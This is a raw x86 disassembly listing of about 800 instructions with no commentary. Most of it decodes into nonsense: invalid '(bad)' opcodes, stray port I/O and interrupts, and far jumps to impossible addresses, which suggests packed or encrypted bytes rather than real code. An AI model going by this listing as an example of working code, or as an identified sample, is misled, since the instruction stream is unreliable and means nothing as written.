  4130d7:	mov    ecx,0x8492bd58
  4130dc:	clc    
  4130dd:	push   esi
  4130de:	jmp    0xaf432e76
  4130e3:	push   ecx
  4130e4:	into   
  4130e5:	adc    DWORD PTR [esi-0x14dbfcce],ecx
  4130eb:	into   
  4130ec:	enter  0xf1dd,0x9d
  4130f0:	xor    dl,BYTE PTR ds:0x568d9d16
  4130f6:	fwait
  4130f7:	test   eax,0x7160b64a
  4130fc:	pop    eax
  4130fd:	sar    DWORD PTR [ecx+0x331e2cd7],0x51
  413104:	mov    bl,0xf6
  413106:	popa   
  413107:	rol    BYTE PTR [edx+0x79],1
  41310a:	ret    
  41310b:	cmp    DWORD PTR [ecx+0x727da5cb],0xf1f915ba
  413115:	sub    edx,DWORD PTR [ebx]
  413117:	mul    edi
  413119:	daa    
  41311a:	push   ds
  41311b:	ins    BYTE PTR es:[edi],dx
  41311c:	je     0x413150
  41311e:	imul   esi,esi,0xe9846550
  413124:	lsl    eax,WORD PTR [edx]
  413127:	adc    DWORD PTR [ecx-0x256f55a7],eax
  41312d:	push   esi
  41312e:	xor    cl,al
  413130:	push   ds
  413131:	sbb    edi,DWORD PTR gs:[edi-0x63ef105a]
  413138:	mov    cl,0xab
  41313a:	out    0x29,al
  41313c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41313d:	inc    ebp
  41313e:	js     0x413190
  413140:	ret    0xc029
  413143:	add    cl,dl
  413145:	xchg   ebx,eax
  413146:	cwde   
  413147:	lds    ecx,FWORD PTR [ecx+0x7589d875]
  41314d:	aam    0x89
  41314f:	jne    0x41313d
  413151:	adc    ecx,0x52b8
  413157:	mov    DWORD PTR [ebp-0x8],esi
  41315a:	xor    ecx,DWORD PTR ds:0x42fd79
  413160:	mov    ecx,DWORD PTR [ebp-0x18]
  413163:	xor    ecx,eax
  413165:	adc    DWORD PTR ds:0x42e1a8,ebx
  41316b:	xor    edi,edi
  41316d:	jmp    0x413451
  413172:	push   0x51581534
  413177:	popa   
  413178:	jne    0x4131ae
  41317a:	add    edx,ebp
  41317c:	cmp    al,BYTE PTR [ecx]
  41317e:	popf   
  41317f:	mov    eax,ds:0x61a38acb
  413184:	jo     0x4131f6
  413186:	mov    ecx,0xa470707e
  41318b:	dec    ebx
  41318c:	adc    DWORD PTR [ebx-0x49],edi
  41318f:	aam    0x3a
  413191:	and    BYTE PTR es:[edx-0x1c],bh
  413195:	ret    0x24b3
  413198:	sbb    BYTE PTR [edi],bl
  41319a:	sub    al,0x41
  41319c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41319d:	fnstenv [ebx+0x7b]
  4131a0:	xor    ecx,esi
  4131a2:	sar    eax,0x9a
  4131a5:	(bad)  
  4131a6:	push   0xf05d5c22
  4131ab:	xor    ecx,edx
  4131ad:	sti    
  4131ae:	cld    
  4131af:	nop
  4131b0:	jb     0x41322e
  4131b2:	sbb    edx,DWORD PTR [edx]
  4131b4:	xchg   DWORD PTR [ebx+esi*1],ebp
  4131b7:	mov    ebx,0xc613ae08
  4131bc:	(bad)  
  4131bd:	repz cmp esi,DWORD PTR [edx]
  4131c0:	push   eax
  4131c1:	jno    0x413148
  4131c3:	rcl    BYTE PTR [edx-0x4e],cl
  4131c6:	mov    ebp,DWORD PTR [edi-0x77660e06]
  4131cc:	sbb    BYTE PTR [edi],dl
  4131ce:	mov    ebx,DWORD PTR [edx]
  4131d0:	call   0x54086ad3
  4131d5:	jp     0x413175
  4131d7:	cld    
  4131d8:	cmp    DWORD PTR [esi+0x48],0x64606c12
  4131df:	outs   dx,BYTE PTR ds:[esi]
  4131e0:	je     0x4131a3
  4131e2:	fisttp DWORD PTR [ebx+eiz*4+0x4a]
  4131e6:	adc    ah,BYTE PTR ds:0xf8298561
  4131ec:	addr16 inc esi
  4131ee:	cdq    
  4131ef:	aad    0x4f
  4131f1:	mov    esp,0xdbcd919a
  4131f6:	(bad)  
  4131f7:	data16 int 0xed
  4131fa:	xor    cl,al
  4131fc:	(bad)
  413200:	and    eax,DWORD PTR [ebp-0x8a2afce]
  413206:	imul   edi,DWORD PTR [ebx+ebx*8],0xffffff94
  41320a:	mov    bh,0x56
  41320c:	xor    eax,eax
  41320e:	mov    bl,BYTE PTR [esi]
  413210:	xlat   BYTE PTR ds:[ebx]
  413211:	mov    ah,0x68
  413213:	pushf  
  413214:	push   ecx
  413215:	jae    0x4131bb
  413217:	dec    esi
  413218:	pop    eax
  413219:	mov    ebp,0x61665c23
  41321e:	jmp    0xc9219992
  413223:	mov    edx,0xefa2a752
  413228:	jo     0x4131e0
  41322a:	mov    ebp,0x318bcb11
  41322f:	in     eax,0xb2
  413231:	or     al,0x85
  413233:	test   DWORD PTR [ebx-0x29],esi
  413236:	sub    al,0x55
  413238:	and    eax,0x3129c4bc
  41323d:	cmp    eax,0x3d606727
  413242:	(bad)  
  413244:	and    al,0x4b
  413246:	add    ebp,esi
  413248:	cs add esi,eax
  41324b:	or     bh,ch
  41324d:	mov    al,0x8f
  41324f:	pop    esi
  413250:	mov    al,ds:0xb19defbf
  413255:	mov    dh,0x4b
  413257:	and    al,ch
  413259:	sti    
  41325a:	int3   
  41325b:	popf   
  41325c:	outs   dx,BYTE PTR ds:[esi]
  41325d:	loope  0x413273
  41325f:	arpl   ax,sp
  413261:	sbb    bl,dl
  413263:	sub    eax,0x782afca7
  413268:	cwde   
  413269:	adc    al,0x2
  41326b:	lea    ebx,[ecx+0x1]
  41326e:	in     eax,0x32
  413270:	aad    0x78
  413272:	mov    WORD PTR [ebx-0xfcde7fa],cs
  413278:	xchg   ebp,eax
  413279:	sbb    BYTE PTR [ebx],bl
  41327b:	cmp    bl,BYTE PTR [esi]
  41327d:	scas   eax,DWORD PTR es:[edi]
  41327e:	cmp    al,0xe6
  413280:	inc    ecx
  413281:	sbb    al,0x58
  413283:	jmp    FWORD PTR [edx+0x73330d04]
  413289:	and    ch,BYTE PTR [ebp+esi*8+0x22]
  41328d:	inc    ebp
  41328e:	mov    cl,0x87
  413290:	addr16 out 0x65,eax
  413293:	ins    DWORD PTR es:[edi],dx
  413294:	in     eax,dx
  413295:	pop    es
  413296:	xor    eax,0x7d89fc8b
  41329b:	shl    BYTE PTR [edi-0x3a],0xb4
  41329f:	div    DWORD PTR [ecx+0x39bacc85]
  4132a5:	stc    
  4132a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4132a7:	dec    edi
  4132a8:	(bad)  [edx+0x49616014]
  4132ae:	sub    BYTE PTR [esi+0x3e],bh
  4132b1:	xchg   edx,eax
  4132b2:	(bad)  
  4132b3:	loope  0x4132cd
  4132b5:	aas    
  4132b6:	gs popa 
  4132b8:	cld    
  4132b9:	jo     0x4132ae
  4132bb:	test   eax,0x8bf3f335
  4132c0:	adc    bh,BYTE PTR [edx+0x3b]
  4132c3:	pop    es
  4132c4:	push   0x9d12fa1a
  4132c9:	xchg   edx,eax
  4132ca:	mov    ah,0x95
  4132cc:	or     edx,0xffffff85
  4132cf:	pop    edx
  4132d0:	jo     0x413313
  4132d2:	std    
  4132d3:	cmp    bh,BYTE PTR [esi+0x4e3969ee]
  4132d9:	inc    ebx
  4132da:	mov    esi,DWORD PTR [esp+ebx*4+0x40]
  4132de:	lods   eax,DWORD PTR ds:[esi]
  4132df:	ret    
  4132e0:	int3   
  4132e1:	(bad)
  4132e4:	jns    0x413325
  4132e6:	xor    BYTE PTR [edx],ah
  4132e8:	(bad)  
  4132ea:	es lock (bad) 
  4132ed:	rcl    BYTE PTR [ebx],cl
  4132ef:	xchg   edi,eax
  4132f0:	xchg   edi,eax
  4132f1:	cmp    BYTE PTR [ebx+0x624bfe13],cl
  4132f7:	lahf   
  4132f8:	mov    bh,0x3c
  4132fa:	jns    0x41334b
  4132fc:	arpl   WORD PTR [edx],bp
  4132fe:	sbb    esi,ecx
  413300:	fldenv [ebx+0x6ca2145e]
  413306:	jae    0x413387
  413308:	(bad)  
  41330a:	dec    eax
  41330b:	mov    ds:0xac956539,al
  413310:	sar    BYTE PTR [eax],0xd6
  413313:	xor    BYTE PTR [edx-0x70],bl
  413316:	mov    edx,0x6626116d
  41331b:	push   edi
  41331c:	dec    BYTE PTR [esi]
  41331e:	(bad)  
  41331f:	or     ecx,eax
  413321:	mov    edi,0x94d28fa1
  413326:	inc    edi
  413327:	mov    ah,0xc7
  413329:	js     0x413310
  41332b:	in     eax,dx
  41332c:	loopne 0x413378
  41332e:	xchg   ebx,eax
  41332f:	or     esi,DWORD PTR [ebp+esi*2-0x268fc0d4]
  413336:	fstp   TBYTE PTR [ecx+eax*2-0x27cc8818]
  41333d:	js     0x413317
  41333f:	gs add eax,0xcdb01235
  413345:	or     eax,0xcdd9e9e6
  41334a:	and    eax,0x231c809
  41334f:	test   eax,0x1c20f365
  413354:	push   ebp
  413355:	add    DWORD PTR [edi-0x77],ecx
  413358:	jecxz  0x413386
  41335a:	mov    al,0x1c
  41335c:	test   eax,0xd269bf19
  413361:	lock or DWORD PTR [ecx],eax
  413364:	push   ss
  413365:	cmp    ch,dh
  413367:	xor    DWORD PTR [eax-0x27bc8c79],esp
  41336d:	sub    edi,DWORD PTR [edi+0x3902aaa4]
  413373:	dec    ebx
  413374:	add    ah,BYTE PTR [ebp-0x2d]
  413377:	stc    
  413378:	int    0x52
  41337a:	(bad)  
  41337b:	cdq    
  41337c:	(bad)  
  41337d:	mov    al,ds:0xf868f7dd
  413382:	lods   eax,DWORD PTR ds:[esi]
  413383:	lea    edx,[ebx-0x1d]
  413386:	in     eax,dx
  413387:	pop    edi
  413388:	int    0x9e
  41338a:	gs dec esi
  41338c:	pop    ds
  41338d:	jl     0x413389
  41338f:	sub    edx,DWORD PTR [ecx+0x4e]
  413392:	ret    0x2679
  413395:	add    al,0x90
  413397:	loop   0x413399
  413399:	(bad)  
  41339a:	mov    ah,0xfe
  41339c:	xchg   BYTE PTR [edx],dl
  41339e:	nop
  41339f:	and    BYTE PTR [ebx],bl
  4133a1:	inc    si
  4133a3:	fstp   QWORD PTR [ecx-0x2f]
  4133a6:	cmp    BYTE PTR [edx+0x12],bh
  4133a9:	fadd   DWORD PTR [edx-0x4b]
  4133ac:	push   esi
  4133ad:	fist   WORD PTR [edx-0x46808489]
  4133b3:	xchg   esi,eax
  4133b4:	out    0xe0,eax
  4133b6:	sbb    DWORD PTR [ebx+0x654ff85],esp
  4133bc:	or     eax,DWORD PTR [ebx]
  4133be:	dec    eax
  4133bf:	inc    ebp
  4133c0:	pop    esp
  4133c1:	test   eax,0x52c87880
  4133c6:	test   al,0xb4
  4133c8:	aas    
  4133c9:	cmp    al,0x83
  4133cb:	fisub  WORD PTR [ecx+eiz*8-0x37]
  4133cf:	inc    ebx
  4133d0:	inc    edi
  4133d1:	sub    cl,al
  4133d3:	repnz sar DWORD PTR [ebp+0x6c5dc767],1
  4133da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133db:	push   edi
  4133dc:	sub    edi,DWORD PTR ds:0x26261093
  4133e2:	xchg   ebx,eax
  4133e3:	push   ebp
  4133e4:	lods   eax,DWORD PTR ds:[esi]
  4133e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4133e6:	and    dl,BYTE PTR [edx]
  4133e8:	cmp    BYTE PTR [esi],dh
  4133ea:	adc    eax,0xdbb6a2b1
  4133ef:	dec    edx
  4133f0:	fmul   DWORD PTR [ebp+0x4f]
  4133f3:	lds    edi,FWORD PTR [edx+0x27]
  4133f6:	retf   0x541a
  4133f9:	sub    cl,BYTE PTR [ebx]
  4133fb:	imul   esi,DWORD PTR [ebp+0x5241e8e7],0xcb8edfce
  413405:	loop   0x413404
  413407:	(bad)  
  413408:	xchg   esi,eax
  413409:	in     eax,0x74
  41340b:	mov    edi,0x62c2efc
  413410:	adc    bl,dh
  413412:	and    al,0x9d
  413414:	and    ebx,DWORD PTR [ebx]
  413416:	lock int3 
  413418:	scas   al,BYTE PTR es:[edi]
  413419:	scas   al,BYTE PTR es:[edi]
  41341a:	jbe    0x4133f3
  41341c:	mov    al,0x91
  41341e:	dec    esp
  41341f:	aas    
  413420:	lea    eax,[ebp+0x40a24190]
  413426:	xchg   ecx,eax
  413427:	pop    es
  413428:	add    DWORD PTR [esi+0x73],eax
  41342b:	cli    
  41342c:	dec    ebx
  41342d:	adc    al,0x53
  41342f:	mov    ch,0x8d
  413431:	xor    ebx,edx
  413433:	mov    ?,eax
  413435:	push   edi
  413436:	cmp    al,0xf6
  413438:	iret   
  413439:	sar    DWORD PTR [edx-0x6],cl
  41343c:	rol    BYTE PTR [ebp-0x64],1
  41343f:	retf   0x5380
  413442:	iret   
  413443:	push   DWORD PTR ss:[esp]
  413447:	inc    esp
  413448:	aas    
  413449:	adc    BYTE PTR [ecx-0xd],bl
  41344c:	jbe    0x413497
  41344e:	sbb    DWORD PTR [edi-0x4734fceb],esp
  413454:	and    DWORD PTR ds:[eax],eax
  413457:	add    BYTE PTR [ecx+0x458be04d],cl
  41345d:	loopne 0x41346e
  41345f:	test   BYTE PTR [esi],al
  413461:	pop    ss
  413462:	add    BYTE PTR [eax],al
  413464:	not    DWORD PTR ds:0x42fd79
  41346a:	mov    eax,DWORD PTR [ebp-0x4]
  41346d:	xor    eax,0x7510855
  413472:	xor    DWORD PTR ds:0x42fd55,0x8f6
  41347c:	add    eax,ebx
  41347e:	jmp    0x413762
  413483:	inc    edx
  413484:	mov    WORD PTR [eax],cs
  413486:	jp     0x41345e
  413488:	adc    BYTE PTR [edx+0x54],0xc3
  41348c:	mov    ss:0x1335f30f,al
  413492:	in     al,dx
  413493:	in     al,dx
  413494:	outs   dx,BYTE PTR ds:[esi]
  413495:	jo     0x413507
  413497:	mov    ecx,0x8f70707e
  41349c:	or     DWORD PTR [eax+0xa63fb09],ebp
  4134a2:	pop    edi
  4134a3:	jns    0x41347d
  4134a5:	retf   
  4134a6:	scas   eax,DWORD PTR es:[edi]
  4134a7:	(bad)  
  4134a8:	push   esp
  4134a9:	push   ecx
  4134aa:	pop    ds
  4134ab:	mov    eax,0x89fd009f
  4134b0:	inc    edx
  4134b1:	in     eax,dx
  4134b2:	clc    
  4134b3:	add    eax,0x1824ef4a
  4134b8:	xchg   ebx,eax
  4134b9:	adc    al,0xab
  4134bb:	and    al,0x93
  4134be:	inc    ah
  4134c0:	push   ebx
  4134c1:	sbb    BYTE PTR [edi+ecx*2+0x64ed552],dh
  4134c8:	enter  0x3e2a,0x24
  4134cc:	jae    0x4134c9
  4134ce:	push   edi
  4134cf:	mov    dl,0x9b
  4134d1:	es push esi
  4134d3:	and    al,0xae
  4134d5:	dec    ecx
  4134d6:	data16 aam 0x73
  4134d9:	lahf   
  4134da:	and    bl,dh
  4134dc:	or     eax,ecx
  4134de:	fs cmp edx,ebx
  4134e1:	mov    eax,0x9203918f
  4134e6:	or     eax,0x318adeb3
  4134eb:	inc    esp
  4134ec:	loop   0x413535
  4134ee:	js     0x41349c
  4134f0:	in     al,0x78
  4134f2:	stos   BYTE PTR es:[edi],al
  4134f3:	dec    esp
  4134f4:	sahf   
  4134f5:	in     eax,0xe9
  4134f7:	sbb    eax,0xc5548a4
  4134fc:	out    0xac,eax
  4134fe:	jns    0x4134ba
  413500:	ret    0x5756
  413503:	leave  
  413504:	(bad)  
  413505:	inc    esp
  413506:	loopne 0x413503
  413508:	xchg   DWORD PTR [eax],ebx
  41350a:	or     eax,0xa0ba09d6
  41350f:	pushf  
  413510:	jno    0x4134d2
  413512:	mov    bh,al
  413514:	daa    
  413515:	enter  0x41bf,0x6d
  413519:	dec    ecx
  41351b:	mov    dh,0x86
  41351d:	mov    al,BYTE PTR [ebx]
  41351f:	imul   ecx,DWORD PTR [ecx-0x5981ed36],0x64698d4e
  413529:	jo     0x413542
  41352b:	jp     0x413590
  41352d:	das    
  41352e:	xchg   esi,eax
  41352f:	mov    eax,ds:0xe690e723
  413534:	inc    esp
  413535:	enter  0x4ae2,0x94
  413539:	stc    
  41353a:	and    DWORD PTR [edx+0x6f4554c4],ebx
  413540:	xchg   esp,eax
  413541:	dec    ecx
  413542:	xchg   edx,eax
  413543:	or     DWORD PTR [ebx+ebp*4],esi
  413546:	daa    
  413547:	hlt    
  413548:	add    al,0xd3
  41354a:	xor    BYTE PTR [edx],0xed
  41354d:	jo     0x4135bf
  41354f:	in     eax,0xbd
  413551:	fcmove st,st(0)
  413553:	fnstenv [esi+0x29c99130]
  413559:	push   0xffffffd9
  41355b:	jmp    0xab36d6cc
  413560:	dec    ebx
  413561:	adc    eax,0x57a2dcda
  413566:	jns    0x4135e1
  413568:	lods   eax,DWORD PTR ds:[esi]
  413569:	sub    esi,DWORD PTR [edi-0x4e8115da]
  41356f:	lods   al,BYTE PTR ds:[esi]
  413570:	iret   
  413571:	rcr    DWORD PTR [ebx-0x5de2c432],cl
  413577:	sub    BYTE PTR [edi-0x18b7814d],cl
  41357d:	test   al,0x76
  41357f:	mov    DWORD PTR [edx-0x77fafa0b],edi
  413585:	mov    dl,0x38
  413587:	pop    eax
  413588:	(bad)  
  41358a:	fcmovnbe st,st(1)
  41358c:	lock aam 0x3a
  41358f:	sbb    dh,bl
  413591:	loop   0x41359c
  413593:	test   al,0x37
  413595:	push   esp
  413596:	fcmovne st,st(2)
  413598:	jb     0x4135ad
  41359a:	jecxz  0x413586
  41359c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41359d:	sti    
  41359e:	xchg   BYTE PTR [esi+0x27],dh
  4135a1:	or     DWORD PTR [eax*8+0x216209ff],ebx
  4135a8:	adc    eax,0x919ecb1d
  4135ad:	or     BYTE PTR [esi],ah
  4135af:	int    0xa6
  4135b1:	sbb    bh,bh
  4135b3:	fldenv [ebx+edx*2-0x78]
  4135b7:	jno    0x413549
  4135b9:	in     al,0xd7
  4135bb:	add    DWORD PTR [ebx],eax
  4135bd:	fstp   QWORD PTR [ecx]
  4135bf:	add    edi,DWORD PTR [ecx+0x4bb9cc40]
  4135c5:	mov    cl,0xc9
  4135c7:	ds cmp dl,bl
  4135ca:	mov    ecx,0x50325129
  4135cf:	pop    ds
  4135d0:	mov    esp,0x76bc9004
  4135d5:	addr16 sahf 
  4135d7:	push   eax
  4135d8:	ret    0xfda3
  4135db:	jmp    0x2bb5:0x90c64dfa
  4135e2:	xor    BYTE PTR [edx+ecx*8-0x25e80a23],dh
  4135e9:	call   0xa68b:0xda648d66
  4135f0:	test   al,0x90
  4135f2:	dec    ebx
  4135f3:	(bad)
  4135f8:	bnd jb 0x413677
  4135fb:	dec    eax
  4135fc:	loopne 0x4135b2
  4135fe:	adc    DWORD PTR gs:[ebp+0x5e78b65],ecx
  413605:	(bad)  
  413606:	and    DWORD PTR [edi+ecx*1-0x2f6c6093],ebx
  41360d:	sbb    eax,0x36c94fe6
  413612:	mov    ebx,0xba0b4faf
  413617:	stos   BYTE PTR es:[edi],al
  413618:	(bad)  
  413619:	je     0x4135e0
  41361b:	xchg   ebp,eax
  41361c:	mov    ebp,0x8a3ea5a6
  413621:	ret    0x6ad1
  413624:	mov    edi,0x9cc42a78
  413629:	push   edx
  41362a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41362b:	inc    ebp
  41362c:	pop    ds
  41362d:	mov    ds:0xff2962ae,al
  413632:	data16 loop 0x413613
  413635:	adc    DWORD PTR [edi-0x249293d5],esi
  41363b:	inc    esi
  41363c:	int3   
  41363d:	xor    esi,DWORD PTR [ebp+0x1]
  413640:	pop    edx
  413641:	mov    ecx,0x1e1379cc
  413646:	loopne 0x413636
  413648:	jb     0x4136c2
  41364a:	push   0x34914fa8
  41364f:	ins    BYTE PTR es:[edi],dx
  413650:	hlt    
  413651:	push   ebp
  413652:	push   ecx
  413653:	stos   DWORD PTR es:[edi],eax
  413654:	dec    eax
  413655:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413656:	jns    0x413697
  413658:	lods   al,BYTE PTR ds:[esi]
  413659:	and    ch,dl
  41365b:	push   es
  41365c:	test   al,0x46
  41365e:	and    al,0xe8
  413660:	jne    0x413666
  413662:	and    al,0xb4
  413664:	jmp    0x6a354f69
  413669:	pop    ss
  41366a:	test   eax,0x3e0d4140
  41366f:	and    al,0x76
  413671:	cmp    eax,0x3c14ba67
  413676:	push   ebx
  413677:	mov    esp,0x96328881
  41367c:	hlt    
  41367d:	in     eax,dx
  41367e:	(bad)  
  41367f:	push   es
  413680:	inc    esp
  413681:	sub    al,0xf4
  413683:	or     DWORD PTR ds:0x821f7981,edx
  413689:	aad    0xff
  41368b:	ins    BYTE PTR es:[edi],dx
  41368c:	mov    ah,0x8e
  41368e:	push   ebx
  41368f:	mov    ebx,0x213b8ec7
  413694:	mov    ecx,0xf02e977e
  413699:	imul   edx,esi,0x424f5843
  41369f:	mov    ebx,0x3f4022bd
  4136a4:	fwait
  4136a5:	jmp    0x35d7:0x817837b8
  4136ac:	mov    ecx,0xa522919e
  4136b1:	and    eax,0xfb85b730
  4136b6:	mov    dh,0x61
  4136b8:	imul   edi,DWORD PTR [edi],0xffffffe0
  4136bb:	adc    dl,BYTE PTR ds:0x4a3e9ba8
  4136c1:	shl    BYTE PTR [edi+0x75af36b8],0xfb
  4136c8:	adc    BYTE PTR ds:0x58e8efa9,dh
  4136ce:	jnp    0x4136f1
  4136d0:	mov    BYTE PTR [ebp+0x3f],ch
  4136d3:	inc    esi
  4136d4:	sub    al,0x97
  4136d6:	or     al,0x2c
  4136d8:	xchg   esi,eax
  4136d9:	xor    edx,edi
  4136db:	retf   
  4136dc:	or     al,0xa6
  4136de:	cld    
  4136df:	rcl    BYTE PTR [esi-0x754bca46],0xad
  4136e6:	shr    bl,1
  4136e8:	mov    BYTE PTR [ecx-0x3e],ch
  4136eb:	ret    0x2693
  4136ee:	xor    DWORD PTR [edx],0xffffffb2
  4136f1:	inc    eax
  4136f2:	fstp   QWORD PTR [edx+0x22]
  4136f5:	test   al,0x7f
  4136f7:	cmp    eax,0x6f56e87a
  4136fc:	jne    0x413775
  4136fe:	xor    bl,BYTE PTR [edx]
  413700:	or     DWORD PTR [ebp+eiz*1-0xa],esp
  413704:	adc    ebp,DWORD PTR [edx]
  413706:	enter  0x73df,0x47
  41370a:	popf   
  41370b:	into   
  41370c:	fiadd  DWORD PTR [ecx]
  41370e:	test   BYTE PTR [ebx],0x35
  413711:	mov    ds:0x93df05bd,al
  413716:	xchg   esp,eax
  413717:	jno    0x413720
  413719:	es data16 jg 0x413711
  41371d:	call   DWORD PTR ds:0x8f266446
  413723:	mov    eax,ds:0xadc02054
  413728:	pop    ebp
  413729:	imul   edi,DWORD PTR [ecx-0x65],0x8344e798
  413730:	or     al,0x40
  413732:	ret    0x9c86
  413735:	cmp    ecx,eax
  413737:	xchg   BYTE PTR [eax],bl
  413739:	je     0x41372c
  41373b:	in     eax,dx
  41373c:	and    al,0x9e
  41373e:	cmp    eax,0xcfbca139
  413743:	leave  
  413744:	push   eax
  413745:	and    DWORD PTR [ecx+0x50e01183],0xffffffc9
  41374c:	lods   al,BYTE PTR ds:[esi]
  41374d:	sar    DWORD PTR [ecx+0x2d241bdd],1
  413753:	sbb    al,ch
  413755:	mov    cl,BYTE PTR [ebx+0x64]
  413758:	imul   eax,DWORD PTR [eax+0x2d1b6521],0xffffffa3
  41375f:	enter  0xf33c,0x3b
  413763:	clc    
  413764:	jne    0x4141ef
  41376a:	push   DWORD PTR [ebp+0x8]
  41376d:	jmp    0x413a51
  413772:	and    al,0x98
  413774:	lods   al,BYTE PTR ds:[esi]
  413775:	shr    BYTE PTR [esp+edx*8-0x305f8b9c],0x9e
  41377d:	in     al,dx
  41377e:	sbb    eax,0x35543e5b
  413783:	imul   esi,DWORD PTR [eax+0x70],0xffffffb9
  413787:	jle    0x4137f9
  413789:	jo     0x413717
  41378b:	xchg   esi,eax
  41378c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41378d:	and    dh,bl
  41378f:	pop    edi
  413790:	das    
  413791:	jge    0x41377f
  413793:	add    al,0xa1
  413795:	mov    ecx,0x54a8bd59
  41379a:	xchg   edi,eax
  41379b:	scas   eax,DWORD PTR es:[edi]
  41379c:	repz push ds
  41379e:	shr    BYTE PTR [esi+0x64],cl
  4137a1:	adc    bh,ah
  4137a3:	idiv   DWORD PTR [ebx]
  4137a5:	jecxz  0x4137f9
  4137a7:	inc    ebp
  4137a8:	pop    esi
  4137a9:	ja     0x41381f
  4137ab:	popa   
  4137ac:	mov    ah,0x60
  4137ae:	ret    
  4137af:	adc    DWORD PTR [ebp-0x3182efe4],0xe1d49456
  4137b9:	xchg   edi,ebp
  4137bb:	test   eax,0xd18c21a5
  4137c0:	popa   
  4137c1:	add    dh,bh
  4137c3:	ret    0x56eb
  4137c6:	cs adc al,0x4b
  4137c9:	ins    BYTE PTR es:[edi],dx
  4137ca:	xchg   edx,eax
  4137cb:	cmp    eax,DWORD PTR [edi+eax*4]
  4137ce:	xor    al,0xb3
  4137d0:	jle    0x4137c6
  4137d2:	cwde   
  4137d3:	sti    
  4137d4:	ret    0xc9d0
  4137d7:	pop    di
  4137d9:	cli    
  4137da:	push   eax
  4137db:	jae    0x4137c5
  4137dd:	mov    bl,0xec
  4137df:	add    eax,0x54d221ad
  4137e4:	clc    
  4137e5:	sub    al,BYTE PTR [edi]
  4137e7:	pushf  
  4137e8:	ins    BYTE PTR es:[edi],dx
  4137e9:	cmp    ecx,ebx
  4137eb:	lock inc esp
  4137ed:	fimul  WORD PTR [ebx+ebx*1-0x5]
  4137f1:	leave  
  4137f2:	xchg   ecx,eax
  4137f3:	mov    bl,0x66
  4137f5:	js     0x4137aa
  4137f7:	aam    0x4
  4137f9:	loope  0x4137ca
  4137fb:	pop    edi
  4137fc:	psubb  mm2,mm7
  4137ff:	inc    edi
  413800:	push   ecx
  413801:	bound  ecx,QWORD PTR [esi-0x1c]
  413804:	enter  0x9bd,0x84
  413808:	jae    0x413885
  41380a:	in     eax,dx
  41380b:	or     eax,0xe3d41cd2
  413810:	call   0xa7db:0xd1a2bf6c
  413817:	test   al,0xce
  413819:	ror    BYTE PTR [ecx],1
  41381b:	repz adc DWORD PTR [eax],ebp
  41381e:	rcl    BYTE PTR [esi+0x57],cl
  413821:	jbe    0x413870
  413823:	ror    dh,0x55
  413826:	push   esp
  413827:	repnz arpl WORD PTR [ecx],cx
  41382a:	aaa    
  41382b:	dec    esi
  41382c:	std    
  41382d:	pushf  
  41382e:	fdiv   QWORD PTR [ecx+0x10]
  413831:	pop    esi
  413832:	lds    edi,FWORD PTR [edx-0x56ac1ab]
  413838:	sbb    eax,0xe7c4cfa6
  41383d:	add    al,BYTE PTR [ecx]
  41383f:	push   0x15
  413841:	push   ebx
  413842:	xchg   edi,eax
  413843:	bound  edi,QWORD PTR [edx+edi*1+0x70eaf452]
  41384a:	sub    ch,BYTE PTR [esi]
  41384c:	mov    ah,0xe3
  41384e:	in     eax,dx
  41384f:	test   DWORD PTR [ecx+0x6c],eax
  413852:	jl     0x413810
  413854:	shl    BYTE PTR [edx+0x2b],0xe3
  413858:	xor    bl,0x51
  41385b:	inc    edx
  41385c:	ja     0x413833
  41385e:	mov    esi,DWORD PTR [eax+0x1c]
  413861:	outs   dx,DWORD PTR ds:[esi]
  413862:	xchg   ebp,eax
  413863:	inc    ebp
  413864:	inc    esi
  413865:	cmp    DWORD PTR [eax+0xf46969e],0x14
  41386c:	mov    esp,0x6208cb89
  413871:	push   eax
  413872:	adc    eax,0xe93655c8
  413877:	add    al,0x5f
  413879:	or     al,0xf
  41387b:	inc    eax
  41387c:	test   DWORD PTR [edi-0xc],esp
  41387f:	push   ds
  413880:	xor    DWORD PTR [esi-0x4a72404f],esp
  413886:	xchg   esi,eax
  413887:	and    DWORD PTR [esi],edx
  413889:	sbb    al,0xfe
  41388b:	call   0x4ffe:0x22f93cdb
  413892:	int3   
  413893:	add    dl,BYTE PTR [ebx-0x2d14549f]
  413899:	out    0xd1,eax
  41389b:	stc    
  41389c:	cmp    eax,0x398b8b39
  4138a1:	cmp    ah,BYTE PTR [esi-0x361a50e9]
  4138a7:	sbb    al,0x90
  4138a9:	xor    al,0x49
  4138ab:	imul   edi,DWORD PTR [ecx-0x62],0x0
  4138af:	fs ja  0x413907
  4138b2:	push   edi
  4138b3:	cmp    dl,BYTE PTR [ebp-0x1fe995db]
  4138b9:	loop   0x413902
  4138bb:	push   ds
  4138bc:	mov    al,ds:0x67b3fc18
  4138c1:	push   es
  4138c2:	mov    ds:0x9cc39c7d,eax
  4138c7:	sti    
  4138c8:	std    
  4138c9:	mov    eax,0x7445076a
  4138ce:	(bad)
  4138d3:	sti    
  4138d4:	out    dx,eax
  4138d5:	aaa    
  4138d6:	mov    bl,0x1e
  4138d8:	(bad)
  4138db:	outs   dx,BYTE PTR ds:[si]
  4138dd:	inc    eax
  4138de:	inc    eax
  4138df:	rol    DWORD PTR [eax],cl
  4138e1:	xor    BYTE PTR [eax+eiz*1],cl
  4138e4:	fcom   QWORD PTR [edx]
  4138e6:	mov    esp,0xa9ebacc8
  4138eb:	mov    bh,0x47
  4138ed:	mov    eax,0xad05f757
  4138f2:	jl     0x4138d3
  4138f4:	stc    
  4138f5:	mov    esi,0x4587ac22
  4138fa:	test   eax,0xf6b9cfd0
  4138ff:	aaa    
  413900:	frstor [eax]
  413902:	mov    ebx,0x7a200dd2
  413907:	mov    ecx,0x47cccc8e
  41390c:	sub    DWORD PTR [esi],eax
  41390e:	std    
  41390f:	aas    
  413910:	cmp    dl,BYTE PTR ds:0x4212654f
  413916:	jmp    0x4138d1
  413918:	inc    ecx
  413919:	pop    esp
  41391a:	imul   ecx,ecx,0xa67fe2b8
  413920:	aas    
  413921:	mov    ebx,0x95f88558
